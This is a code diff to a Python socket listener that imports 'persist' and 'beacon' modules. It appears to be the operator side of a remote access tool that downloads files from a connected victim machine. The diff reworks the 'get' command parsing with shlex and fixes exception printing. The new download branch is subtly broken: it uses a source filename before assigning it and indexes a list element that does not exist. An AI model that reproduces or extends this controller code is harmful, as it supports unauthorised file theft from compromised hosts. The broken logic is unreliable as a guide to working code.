@@ -6,7 +6,7 @@ dname = os.path.dirname(abspath)
 os.chdir(dname)
 
 import socket, ssl, persist, beacon
-import argparse
+import argparse, shlex
 from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
 from printlib import *
 from os import path, remove, kill, getpid, listdir
@@ -150,7 +150,7 @@ def file_transfer_get(conn, filename):      #get file from server
         if VERBOSE:
             print_good("Transfer completed")
     except Exception as e:
-            print(exc_info)
+            print(exc_info())
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
@@ -384,35 +384,42 @@ def listen():
                     conn.close()
                     exit(1)
                 elif cmd == "get" or cmd == "1":
-                    command = input("get > ")
-                    if command != "back":
-                        command = "[get] " + command
+                    print("<source> <dest>")
+                    filename_cmd = input("get > ")
+                    if filename_cmd != "back":
+                        transfer = False
                         path_exists = True
-                        if len(command.split()) == 1:
-                            print_warn("Incomplete command") 
-                        elif len(command.split())== 2:
-                            command = command + " " + path.basename(command.split()[1])
-                            file_transfer_get(conn, command)
-                        elif len(command.split())== 3:
-                            if path.dirname(command.split()[2]) != "":
-                                path_exists = path.exists(path.dirname(command.split()[2]))
+                        dest_filename = ""
+                        filename_array = shlex.split(filename_cmd)
+                        if len(filename_array) == 1:
+                            dest_filename = filename_array[0]
+                            src_filename = filename_array[0]
+                            send_data(conn, "[get] " + src_filename + "[END]")
+                            transfer = True
+                        elif len(filename_array)== 2:
+                            if path.dirname(filename_array[1]) != "":
+                                path_exists = path.exists(path.dirname(filename_array[1]))
+                                transfer = True
                             if path_exists:
-                                new_cmd = " ".join(command.split()[:2])
-                                send_data(conn, new_cmd + "[END]")
-                                file = command.split()
-                                dest_filename = file[2]
-                                if VERBOSE:
-                                    print_info("Trying to Download {} --> {}".format(command.split()[1], dest_filename))
-                                
-                                data = conn.recv(1024).decode('utf-8')
-                                if "[file-not-found]" in data:
-                                    print_fail("File not found")          
-                                elif "[file-found]" in data:
-                                    if VERBOSE:
-                                        print_good("File Found, Downloading...")
-                                    file_transfer_get(conn, dest_filename)
+                                send_data(conn, "[get] " + src_filename + "[END]")
+                                src_filename = filename_array[1]
+                                dest_filename = filename_array[2]
+                                transfer = True
                             else:
-                                print_warn("Destination file path does not exist")
+                                print_fail("Destination file path does not exist")
+                                
+                        
+                        if transfer is True:
+                            if VERBOSE:
+                                    print_info("Trying to Download {} --> {}".format(src_filename, dest_filename))
+                            data = conn.recv(1024).decode('utf-8')
+                            
+                            if "[file-not-found]" in data:
+                                print_fail("File not found")          
+                            elif "[file-found]" in data:
+                                if VERBOSE:
+                                    print_good("File Found, Downloading...")
+                                file_transfer_get(conn, dest_filename)
                     cmd = ""
 ##################
 #UPLOAD FILE     #
@@ -528,7 +535,7 @@ def listen():
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
         except Exception as e:
-            print(exc_info)
+            print(exc_info())
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         except ConnectionAbortedError:
